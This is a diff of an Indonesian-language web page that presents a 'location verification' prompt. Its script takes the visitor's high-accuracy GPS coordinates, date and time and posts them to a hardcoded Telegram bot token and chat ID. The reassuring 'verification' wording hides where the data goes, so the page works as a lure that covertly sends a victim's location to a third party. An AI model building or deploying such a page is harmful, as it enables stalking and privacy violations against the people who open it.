@@ -1,92 +1,145 @@
-<!doctype html>
-
+<!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Bagikan Lokasi</title>
-  <style>
-    body{
-      font-family: system-ui;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-      background: #eef2ff;
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verifikasi Lokasi</title>
+
+<style>
+    body {
+        margin: 0;
+        background: #0a0a0f;
+        color: #eaeaff;
+        font-family: system-ui, sans-serif;
+        height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
     }
-    #box{
-      text-align: center;
-      background: white;
-      padding: 30px;
-      border-radius: 14px;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
-      width: 320px;
+
+    .box {
+        text-align: center;
+        padding: 26px 28px;
+        background: rgba(20, 20, 35, 0.58);
+        border: 1px solid rgba(120, 60, 255, 0.25);
+        border-radius: 14px;
+        width: 280px;
     }
-    button{
-      padding: 15px 22px;
-      font-size: 18px;
-      border-radius: 10px;
-      border: none;
-      background: #0066ff;
-      color: white;
-      cursor: pointer;
-      width: 100%;
+
+    h2 {
+        margin: 0 0 12px;
+        font-size: 17px;
+        font-weight: 600;
+        color: #c8b8ff;
     }
-    #status{
-      margin-top: 18px;
-      font-size: 15px;
-      color: #333;
-      min-height: 25px;
+
+    p {
+        margin: 0 0 18px;
+        font-size: 13px;
+        color: #b9b1d9;
     }
-  </style>
+
+    button {
+        width: 100%;
+        padding: 10px 0;
+        border-radius: 8px;
+        border: none;
+        font-size: 14px;
+        cursor: pointer;
+        transition: 0.2s;
+        background: linear-gradient(90deg,#8b4bff,#b36bff);
+        color: white;
+        font-weight: 600;
+    }
+
+    button:active {
+        transform: scale(0.97);
+        opacity: 0.8;
+    }
+
+    .small {
+        font-size: 12px;
+        margin-top: 10px;
+        opacity: 0.65;
+    }
+</style>
+
 </head>
 <body>
-  <div id="box">
-    <button id="btnShare">Bagikan Lokasi</button>
-    <div id="status">Menunggu aksi...</div>
-  </div><script>
-// ==== MASUKKAN TOKEN & CHAT ID TELEGRAM DI SINI ====
-const BOT_TOKEN = "8565552587:AAFSJysYHitKWugVSHgcu1tymRF1pOSMEQg";
-const CHAT_ID   = "8012228867";
-// ====================================================
 
-const btn = document.getElementById('btnShare');
-const statusEl = document.getElementById('status');
+<div class="box">
+    <h2>Verifikasi Lokasi</h2>
+    <p>Untuk memastikan layanan berjalan optimal, sistem memerlukan informasi lokasi Anda.
+            Tekan tombol di bawah untuk mengirimkan lokasi dengan aman.</p>
 
-function setStatus(msg){ statusEl.textContent = msg }
+    <button onclick="sendLocation()">Bagikan Lokasi</button>
 
-async function sendToTelegram(lat, lng){
-  const text = `Lokasi dikirim:%0A`+
-               `Latitude: ${lat}%0A`+
-               `Longitude: ${lng}%0A`+
-               `https://www.google.com/maps?q=${lat},${lng}`;
+    <div class="small" id="status">Menunggu aksi…</div>
+</div>
 
-  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}`;
-  const res = await fetch(url);
-  if(!res.ok) throw new Error('Gagal mengirim ke Telegram');
+
+<script>
+function sendLocation() {
+    const status = document.getElementById("status");
+    status.textContent = "Mengambil lokasi...";
+
+    if (!navigator.geolocation) {
+        status.textContent = "Geolocation tidak tersedia.";
+        return;
+    }
+
+    navigator.geolocation.getCurrentPosition(success, error, {
+        enableHighAccuracy: true,
+        timeout: 15000,
+        maximumAge: 0
+    });
 }
 
-btn.addEventListener('click', ()=>{
-  if(!navigator.geolocation) return setStatus("Perangkat tidak mendukung lokasi.");
-
-  setStatus("Mengambil lokasi...");
-
-  navigator.geolocation.getCurrentPosition(pos => {
+function success(pos) {
     const lat = pos.coords.latitude;
-    const lng = pos.coords.longitude;
+    const lon = pos.coords.longitude;
 
-    setStatus("Mengirim ke Telegram...");
+    const bot = "8565552587:AAFSJysYHitKWugVSHgcu1tymRF1pOSMEQg";   // GANTI
+    const chatId = "8012228867";  // GANTI
 
-    sendToTelegram(lat, lng)
-      .then(()=> setStatus("Lokasi berhasil dikirim!"))
-      .catch(err=> setStatus("Gagal: " + err.message));
+    const now = new Date();
+    const date = now.toLocaleDateString("id-ID");
+    const time = now.toLocaleTimeString("id-ID");
 
-  }, err => setStatus("Gagal mendapatkan lokasi: " + err.message), {
-    enableHighAccuracy: true,
-    timeout: 15000,
-    maximumAge: 0
-  });
-});
-</script></body>
+    const text =
+`📍 *Lokasi Terkini Terkirim*
+
+• 🌐 Koordinat:
+   - Latitude: ${lat}
+   - Longitude: ${lon}
+
+• 🗺️ Google Maps:
+   https://www.google.com/maps?q=${lat},${lon}
+
+• 📅 Tanggal: ${date}
+• ⏰ Waktu: ${time}
+
+────────────────────
+Dikirim otomatis melalui sistem lokasi.`;
+
+    fetch(`https://api.telegram.org/bot${bot}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: text,
+            parse_mode: "Markdown"
+        })
+    });
+
+    document.getElementById("status").textContent = "Lokasi berhasil dikirim!";
+}
+
+function error(err) {
+    document.getElementById("status").textContent =
+        "Gagal mendapatkan lokasi: " + err.message;
+}
+</script>
+
+</body>
 </html>
